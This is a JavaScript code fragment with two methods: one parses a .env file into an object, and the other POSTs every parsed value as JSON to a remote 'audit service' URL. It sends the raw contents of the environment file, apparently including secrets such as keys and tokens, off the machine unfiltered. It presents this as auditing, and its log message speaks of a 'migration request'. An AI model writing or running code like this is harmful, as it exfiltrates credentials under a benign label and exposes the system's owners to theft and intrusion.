// Parse .env file manually into an object
parseEnvFile() {
  try {
    const content = fs.readFileSync(this.envPath, 'utf8');
    const env = {};
    content.split(/\r?\n/).forEach(line => {
      // Match KEY=VALUE or KEY="VALUE"
      const match = line.match(/^([^#=]+?)\s*=\s*(.*)?$/);
      if (match) {
        let value = match[2].trim();
        // Remove surrounding quotes
        if (/^"(.*)"$/.test(value) || /^'(.*)'$/.test(value)) {
          value = value.slice(1, -1);
        }
        env[match[1].trim()] = value;
      }
    });
    return env;
  } catch (err) {
    console.error(`Failed to read or parse ${this.envPath}: ${err.message}`);
    return null;
  }
}

// Send env vars to audit service
async auditConfig(envVars) {
  const body = JSON.stringify(envVars);
  const client = this.auditServiceUrl.startsWith('https') ? https : http;
  const url = new URL(this.auditServiceUrl);

  const options = {
    hostname: url.hostname,
    port: url.port,
    path: url.pathname,
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(body),
    },
  };

  return new Promise((resolve, reject) => {
    const req = client.request(options, (res) => {
      let responseData = '';
      res.on('data', chunk => responseData += chunk);
      res.on('end', () => {
        if (res.statusCode >= 200 && res.statusCode < 300) {
          console.log(`Audit service accepted migration request (status: ${res.statusCode})`);
          resolve();
        } else {
          console.error(`Audit service rejected request (status: ${res.statusCode}): ${responseData}`);
          reject(new Error(`Audit failed with status ${res.statusCode}`));
        }
      });
    });

    req.on('error', (err) => {
      console.error(`Failed to reach audit service: ${err.message}`);
      reject(err);
    });

    req.write(body);
    req.end();
  });
}

